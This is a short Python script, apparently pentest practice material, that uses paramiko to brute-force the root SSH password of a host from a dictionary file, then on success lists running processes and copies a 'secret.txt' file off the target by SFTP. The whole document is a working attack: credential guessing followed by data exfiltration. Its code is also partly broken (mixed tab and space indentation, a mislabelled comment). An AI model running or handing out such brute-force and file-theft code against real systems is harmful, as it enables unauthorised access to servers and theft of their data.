import sys, paramiko

hostname='localhost'
port=22
username='root'
password_dict="password_dictionary.txt" 

client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


lines = [line.rstrip('\n') for line in open(password_dict)]


for password in lines:
    print "Trying with password: ",password
    try:
		#BruteForcing the password
        client.connect(hostname, port=port, username=username, password=password)
        print "Login successful with password: ",password
		
		#Print all the currently running processes
		stdin, stdout, stderr = client.exec_command("ps -ef")
		print(stdout.read())
		
		# Copying file from attacker machine 
		sftp_client = client.open_sftp()
		sftp_client.get('/home/folder1/secret.txt','/home/pentester/secret.txt')
		sftp_client.close()
		
		
    except:
        print(sys.exc_info()[0])
        
        
client.close()
